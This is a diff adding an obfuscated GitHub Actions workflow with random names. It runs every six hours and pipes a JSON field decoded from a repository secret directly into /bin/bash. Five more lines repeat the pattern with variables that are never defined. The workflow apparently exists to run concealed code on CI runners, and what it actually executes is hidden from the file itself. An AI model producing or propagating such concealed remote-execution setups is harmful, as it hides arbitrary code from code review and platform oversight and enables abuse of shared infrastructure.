@@ -1,0 +1,22 @@
+name: jinrongxuezhidaobu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jinrongxuezhidaobu
+        env:
+          qyvp98: ${{ secrets.qyvp98 }}
+        run: |
+          echo $qyvp98 | jq -r .zkkty2 | /bin/bash
+          echo $mv8 | jq -r .mphzj6770 | /bin/bash
+          echo $bwl1689 | jq -r .o5 | /bin/bash
+          echo $x3240 | jq -r .i528 | /bin/bash
+          echo $y37912 | jq -r .u6 | /bin/bash
+          echo $gt0 | jq -r .r0 | /bin/bash
+
